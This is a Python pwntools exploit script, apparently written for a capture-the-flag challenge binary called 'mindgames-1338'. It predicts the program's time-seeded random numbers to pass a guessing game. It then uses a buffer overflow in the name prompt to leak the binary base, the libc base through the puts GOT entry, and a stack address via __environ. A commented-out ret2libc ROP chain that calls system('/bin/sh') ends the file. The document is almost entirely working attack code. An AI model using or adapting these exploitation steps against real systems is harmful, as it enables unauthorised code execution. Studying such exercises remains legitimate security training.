from re import findall
from datetime import datetime
from ctypes import CDLL
from pwn import *
import struct

# exe = context.binary = ELF(args.EXE or './mindgames-1338')
context.log_level = 'error'
context.terminal = '/bin/sh'
# context.aslr = False
context.arch = 'amd64'
context.os = 'linux'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#==============Funcion bypassing mindlogic==================

def bypassranval():
    p.sendlineafter('Exit\n> '.encode(), str(2).encode())
    p.sendlineafter('> '.encode(), str(C.rand()).encode())
    for i in range(highscore):
        p.sendlineafter('>'.encode(), str(C.rand()).encode())
    p.sendlineafter('>'.encode(), str('1234').encode())

#=============================================================
#      Functions End here and Including starts
#=============================================================

elf = context.binary = ELF("./mindgames-1338")
libc = ELF('libc.so.6')
C = CDLL('libc.so.6')
rop = ROP(libc)

p = process("./mindgames-1338")
# p = remote("mindgames.secenv", 1338)
context.log_level = 'debug'

#=============Gnereating same random val seed==================

strdate = re.findall(b"[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}", p.recvline())[0].decode()
epoch = datetime.strptime(strdate+'-+0000',"%Y-%m-%d %H:%M:%S-%z").timestamp()
# print(strdate)
# print("Timer = ", int(epoch) - 18000)

C.srand(int(epoch) - 18000)                         # for binary 
# C.srand(int(epoch))                               # for port

randval = C.rand()
highscore = (C.rand() % 32) + 1
print("Highscore = ", highscore)

#===================================================================

bypassranval()

#==================Finding Binary Base address=====================

integer_value = 12
integer_bytes = struct.pack("<Q", integer_value)
# data = b'\xc8'
# data_byte = data.ljust(8, b'\x00')

junk = b'A' * 32
p.sendafter('name: '.encode(), junk + integer_bytes  + b'\xe8')

p.sendlineafter('> '.encode(), str(1).encode())
p.recvuntil("highscore:".encode())
p.recvuntil(b"\t by \t")
leaked_pie = unpack(p.recvuntil(b'\n')[1:-1].ljust(8, b'\x00'))
binary_base = leaked_pie  - 0x40e8
print("Leaked ADDR = ", hex(leaked_pie))
print("Binary Base addr = ", hex(binary_base))

#===================================================================

C.rand()          ## one extra random value that skipped in last loop
bypassranval()    ## calling function to bypass logic

#===============Finding libc base addresss==========================

puts_got = binary_base + elf.got.puts

print("Address of the puts ==== ", hex(elf.got.puts))
print("Address of the puts got  ==== ", hex(puts_got))

junk = b'A' * 32
p.sendlineafter('name: '.encode(), junk + integer_bytes + p64(puts_got))

p.sendlineafter('> '.encode(), str(1).encode())
p.recvuntil("highscore:\n".encode())
print(p.recvuntil(b"\t by \t"))
leaked_addr = unpack(p.recvuntil(b"\n")[1:-1].ljust(8, b'\x00'))
print("Leaked addr of libc  = ", hex(leaked_addr))
print("Puts offset in libc = ", hex(libc.symbols['puts']))
# libc_base = leaked_addr  - libc.sym.puts                     ## for port
libc_base = leaked_addr  - 0x83630                             ## for binary 
print("Libc Base addr = ", hex(libc_base))

#===================================================================

C.rand()          ## one extra random value that skipped in last loop
bypassranval()    ## calling function to bypass logic

#====================Bypassing canary mitigation====================

junk = b'A' * 32
environ_var = pack(libc.symbols['__environ'])
p.sendafter('name: '.encode(), junk + integer_bytes + environ_var)

p.sendlineafter('> '.encode(), str(1).encode())
p.recvuntil("highscore:\n".encode())
print(p.recvuntil(b"\t by \t"))
# leaked_addr = unpack(p.recvuntil(b"\n")[1:-1].ljust(8, b'\x00'))
# print("Leaked addr of libc  = ", hex(leaked_addr))

#================= Now we will bypass NX bit =====================

# junkthistime = b'A' * 280
# # canary = 
# ret = libc_base + rop.find_gadget(["ret"]).address
# pop_rdi_ret = libc_base + rop.find_gadget(["pop rdi", "ret"]).address
# bin_sh = libc_base + next(libc.search(b"/bin/sh"))
# system = libc_base + libc.symbols["system"]
# exit  = libc_base + libc.symbols["exit"]

# payload = flat(junkthistime, ret, pop_rdi_ret, bin_sh, system, exit)
# p.sendlineafter(b"name: ", payload)
# p.interactive()